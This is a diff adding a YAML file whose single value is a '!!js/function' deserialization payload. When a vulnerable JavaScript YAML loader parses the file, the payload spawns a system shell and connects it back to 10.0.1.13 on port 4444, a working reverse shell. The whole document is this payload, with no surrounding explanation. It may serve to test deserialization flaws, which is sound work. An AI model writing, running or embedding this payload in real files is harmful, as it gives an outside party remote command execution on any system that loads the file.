@@ -1,0 +1,2 @@
+a: !!js/function >
+  (function(){  (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; client.socket = net.connect(4444, "10.0.1.13", function() { client.socket.pipe(sh.stdin); util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); }); })(); })();
